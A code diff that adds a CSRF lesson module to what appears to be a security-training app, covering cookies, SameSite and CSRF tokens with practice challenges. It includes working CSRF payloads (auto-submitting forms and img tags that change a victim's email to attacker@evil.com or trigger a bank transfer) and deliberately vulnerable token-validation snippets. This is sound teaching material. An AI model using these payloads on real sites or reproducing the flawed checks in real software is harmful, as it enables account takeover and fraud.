@@ -458,4 +458,229 @@ DELETE FROM tickets WHERE priority = 'Low';
       },
     },
   },
+
+  csrf: {
+    title: "Cross-Site Request Forgery (CSRF)",
+    color: "purple",
+    sections: [
+      {
+        type: "module-intro",
+        sections: [
+          {
+            heading: "HTTP is stateless",
+            body: "Every HTTP request arrives at the server with no memory of the last one. When you log in, the server doesn't 'remember' you — it can't. So it hands the browser a session cookie: a unique token that proves who you are.",
+          },
+          {
+            heading: "What a cookie is",
+            body: "A cookie is a small key-value pair the server asks the browser to store. The browser attaches it automatically to every future request to that domain — you never have to do anything. This is what makes 'stay logged in' work.",
+            code: `// Server sets a cookie after login:
+Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax
+
+// Browser attaches it automatically on every request:
+GET /dashboard HTTP/1.1
+Cookie: session_id=abc123`,
+          },
+          {
+            heading: "Cookie security flags",
+            body: "Three flags control how safely a cookie behaves. HttpOnly stops JavaScript from reading it (blocks XSS theft). Secure means HTTPS only. SameSite controls whether the browser sends it on cross-site requests — and that's exactly what CSRF exploits when it's missing or too permissive.",
+          },
+        ],
+      },
+      {
+        type: "csrf-flow",
+      },
+      {
+        type: "intro",
+        heading: "What is CSRF?",
+        body: "Cross-Site Request Forgery tricks a victim's browser into making a request to a site they're already logged in to — without them knowing. The attack doesn't steal credentials or inject code. It weaponises the browser's own behaviour: the automatic attachment of session cookies to every matching request.",
+      },
+      {
+        type: "cards",
+        heading: "Why is it dangerous?",
+        items: [
+          {
+            icon: "💸",
+            title: "Unauthorised Actions",
+            side: "left",
+            body: "Change email, transfer funds, delete accounts — any state-changing action the victim can do, CSRF can do on their behalf.",
+            code: `<!-- Attacker's page — victim never sees this -->
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+<!-- Browser fires GET, attaches session cookie, transfer succeeds -->`,
+          },
+          {
+            icon: "🔑",
+            title: "Account Takeover",
+            side: "right",
+            body: "Change the victim's password or email to one the attacker controls — then log in as them at leisure.",
+            code: `<form method="POST" action="https://app.com/change-email">
+  <input name="email" value="attacker@evil.com">
+  <input name="csrf_token" value="ignored">
+</form>
+<script>document.forms[0].submit()</script>`,
+          },
+          {
+            icon: "👤",
+            title: "Invisible to the Victim",
+            side: "left",
+            body: "The victim sees nothing. The request fires in the background — no click, no prompt, no warning.",
+            code: `<!-- A 1x1 invisible image is enough for a GET-based CSRF -->
+<img src="https://target.com/action" width="0" height="0">`,
+          },
+          {
+            icon: "🌐",
+            title: "No Code Injection Needed",
+            side: "right",
+            body: "Unlike XSS, CSRF doesn't inject any code into the target site. It exploits legitimate browser behaviour — making it harder to detect and filter.",
+            code: `// XSS: attacker's code runs ON the target site
+// CSRF: attacker's page makes the browser call the target site
+// The target site sees a perfectly normal authenticated request`,
+          },
+        ],
+      },
+      {
+        type: "code",
+        heading: "What a basic CSRF payload looks like",
+        language: "html",
+        code: `<!-- The attacker hosts this page anywhere -->
+<!-- When the victim visits it while logged in to target.com: -->
+
+<!-- GET-based CSRF (simplest — fires automatically on load) -->
+<img src="https://target.com/change-email?email=attacker@evil.com">
+
+<!-- POST-based CSRF (auto-submitting hidden form) -->
+<form method="POST" action="https://target.com/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit()</script>`,
+      },
+      {
+        type: "types",
+        heading: "Three types of CSRF",
+        items: [
+          { name: "GET-based",    color: "yellow", desc: "Simplest form. A single <img> or <a> tag fires a GET request automatically. Any endpoint that changes state via GET is vulnerable." },
+          { name: "POST-based",   color: "orange", desc: "A hidden auto-submitting form sends a POST request. Most state-changing endpoints use POST — so most real CSRF attacks look like this." },
+          { name: "Token bypass", color: "red",    desc: "A CSRF token is present in the form but the server doesn't validate it — or accepts any value. The token is theatre, not protection." },
+        ],
+      },
+      {
+        type: "cta",
+        heading: "Ready to practice?",
+        body: "You'll start with the simplest CSRF: a GET request with no token. Your goal is to craft an attacker page that silently changes the victim's email.",
+      },
+    ],
+    bridgeLectures: {
+      "post-forms": {
+        title: "POST Requests & Auto-Submitting Forms",
+        sections: [
+          {
+            type: "intro",
+            heading: "Why GET requests should never change state",
+            body: "GET requests are supposed to be 'safe' — they retrieve data, not modify it. Browsers, proxies, and search engine crawlers freely follow GET links, which makes a GET-based state change catastrophically easy to exploit. Well-designed applications use POST (or PUT/DELETE) for any action that changes data.",
+          },
+          {
+            type: "code",
+            heading: "The hidden form pattern",
+            language: "html",
+            code: `<!-- The img tag trick no longer works — the endpoint requires POST -->
+<!-- Instead, craft a hidden form that submits itself immediately -->
+
+<form method="POST" action="https://target.com/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>
+  // Submit the form the instant the attacker's page loads
+  document.forms[0].submit();
+</script>
+
+<!-- The browser sends a POST with the victim's session cookie attached.
+     The server sees a fully authenticated request and processes it. -->`,
+          },
+          {
+            type: "flow",
+            heading: "Why POST still doesn't help without a CSRF token",
+            steps: [
+              { icon: "🌐", label: "Victim visits attacker page", detail: "Logged in to the target site in another tab" },
+              { icon: "📋", label: "Form auto-submits", detail: "JavaScript calls .submit() on the hidden form before the victim sees anything" },
+              { icon: "🍪", label: "Browser attaches cookie", detail: "The session cookie goes along automatically — POST or GET, it doesn't matter" },
+              { icon: "✅", label: "Server accepts it", detail: "The server sees a valid POST with a valid session — it has no way to tell the request didn't originate from its own page" },
+            ],
+          },
+          {
+            type: "cta",
+            heading: "Try Challenge 2",
+            body: "The endpoint now requires POST. Use the hidden form pattern to trigger the action.",
+            buttonLabel: "Go to Challenge 2 →",
+          },
+        ],
+      },
+      "csrf-tokens": {
+        title: "CSRF Tokens & How They Fail",
+        sections: [
+          {
+            type: "intro",
+            heading: "The intended defence: CSRF tokens",
+            body: "A CSRF token is a secret, per-session, unpredictable value embedded in every form. When the form is submitted, the server checks that the token matches the one it issued for this session. Because an attacker's page can't read the token from the target site (blocked by the Same-Origin Policy), it can't forge a valid request.",
+          },
+          {
+            type: "code",
+            heading: "What correct CSRF token validation looks like",
+            language: "python",
+            code: `# Server generates a token and stores it in the session
+session['csrf_token'] = secrets.token_hex(32)
+
+# Server embeds it in the form
+# <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
+
+# On form submission, the server validates it:
+if request.form['csrf_token'] != session['csrf_token']:
+    abort(403)  # Reject — token mismatch`,
+          },
+          {
+            type: "cards",
+            heading: "Three ways CSRF tokens fail",
+            items: [
+              {
+                icon: "🚫",
+                title: "Token present, not checked",
+                side: "left",
+                body: "The most common failure: the token exists in the form, but the server never actually validates it. Any value — or no value — is accepted.",
+                code: `# Vulnerable: token is generated but never checked
+@app.post("/change-email")
+def change_email():
+    new_email = request.form['email']
+    # csrf_token is in the form but ignored here
+    update_email(current_user, new_email)`,
+              },
+              {
+                icon: "🔁",
+                title: "Token not tied to session",
+                side: "right",
+                body: "The token is validated, but any valid token for any user is accepted. An attacker who has their own account can reuse their own token in a forged request against any victim.",
+                code: `# Vulnerable: checks token exists in DB, not that it matches this session
+if CsrfToken.find(token=request.form['csrf_token']):
+    proceed()  # Any token from any session works`,
+              },
+              {
+                icon: "📭",
+                title: "Blank token accepted",
+                side: "left",
+                body: "The validation logic fails open: if the token field is empty or missing, the check is skipped entirely.",
+                code: `# Vulnerable: falsy token skips the check
+token = request.form.get('csrf_token')
+if token and token != session['csrf_token']:
+    abort(403)
+# If token is '' or missing, the if-block is skipped — request proceeds`,
+              },
+            ],
+          },
+          {
+            type: "cta",
+            heading: "Try Challenge 3",
+            body: "The form has a CSRF token field — but the server doesn't validate it. Submit any value and watch it succeed.",
+            buttonLabel: "Go to Challenge 3 →",
+          },
+        ],
+      },
+    },
+  },
 };
